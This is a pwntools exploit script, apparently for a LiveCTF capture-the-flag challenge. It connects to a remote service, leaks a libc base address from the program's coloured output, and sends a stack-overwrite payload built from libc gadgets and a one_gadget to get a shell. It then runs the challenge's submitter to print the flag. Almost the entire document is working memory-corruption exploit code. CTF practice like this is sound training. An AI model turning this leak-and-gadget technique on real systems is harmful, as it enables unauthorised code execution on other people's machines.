from pwn import *
from time import sleep
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

exe = ELF("challenge", checksec=False)
libc = ELF("libc.so.6", checksec=False)

#context.log_level = "DEBUG"
context.binary = exe
#context.aslr = False

#r = process(exe.path)
r = remote(HOST, int(PORT))

r.sendlineafter(b"?\n", b"10")
r.sendlineafter(b"?\n", b"3")

r.sendlineafter(b"?\n", b"\xff"*10)
r.sendlineafter(b"?\n", b"\xff"*0xc8)

leaks = r.recvuntil(b"What").replace(b"\x1B[1;30;43m ", b"").replace(b"\x1B[0m ", b"").replace(b"\x1B[1;30;42m ", b"").replace(b" ", b"")
libc.address = unpack(leaks[155:161], 48) - 0x29d90
log.info("Libc => %s" % hex(libc.address))

xor_edx_edx = libc.address+0xa8558
one_gadg = libc.address+0xebc85

payload = flat([
    b"X"*0x7,
    (0x2<<32) | 0x62,
    b"Y"*0x10,
    libc.bss(0x3000),
    libc.address+0xa85d8,
    libc.address+0xebcf5
]).ljust(0xff, b"\x00")

r.sendlineafter(b"?\n", payload)

sleep(0.5)

r.sendline(b'./submitter')
r.recvuntil(b'LiveCTF')
flag = r.recvline().rstrip(b'\n').decode()
log.info('Flag: %s', 'LiveCTF'+flag)